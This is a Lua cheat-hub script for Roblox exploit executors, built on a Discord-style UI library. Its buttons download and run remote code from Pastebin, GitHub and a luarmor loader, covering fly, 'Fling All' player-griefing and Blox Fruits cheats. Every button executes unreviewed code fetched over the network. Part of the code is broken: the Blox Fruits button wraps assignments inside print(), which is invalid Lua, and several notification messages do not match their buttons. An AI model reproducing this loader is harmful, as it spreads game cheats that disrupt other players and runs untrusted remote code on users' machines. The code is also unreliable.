local DiscordLib =
    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()

local win = DiscordLib:Window("discord library")

local serv = win:Server("CloudHub Script", "")

local btns = serv:Channel("Universal")

btns:Button(
    "Mobile Keyboard",
    function() print(loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))())
        DiscordLib:Notification("Notification", "Killed everyone!", "Okay!")
    end
)

btns:Seperator()

btns:Button(
    "FLY GUI",
    function()
    print(loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))())
        DiscordLib:Notification("Notification", "Max level!", "Okay!")
    end
)

btns:Seperator()

btns:Button(
    "Touch Fling Script",
    function()
    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))())
        DiscordLib:Notification("Notification", "Max level!", "Okay!")
    end
)

btns:Seperator()

btns:Button(
    "Fling All",
    function()
    print(loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))())
        DiscordLib:Notification("Notification", "Executed")
    end
)

local btns = serv:Channel("Blox Fruits")

btns:Button(
    "W-Azure",
    function() print(getgenv().Team = "Pirates"
getgenv().FixCrash = false
getgenv().FixCrash2 = false
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))())
        DiscordLib:Notification("Notification", "Executed")
    end
)


serv:Channel("by dawid#7205")

win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
